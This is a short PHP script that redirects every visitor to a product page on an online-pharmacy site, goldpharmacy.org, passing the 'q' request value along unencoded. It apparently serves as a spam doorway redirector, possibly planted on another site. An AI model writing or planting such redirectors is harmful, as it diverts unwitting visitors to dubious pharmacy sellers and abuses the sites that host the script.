<?php
$qid  = $_REQUEST['q']; 
$redirect_url='http://goldpharmacy.org/?product='.$qid;
header('Location: '.$redirect_url);
exit;
?>
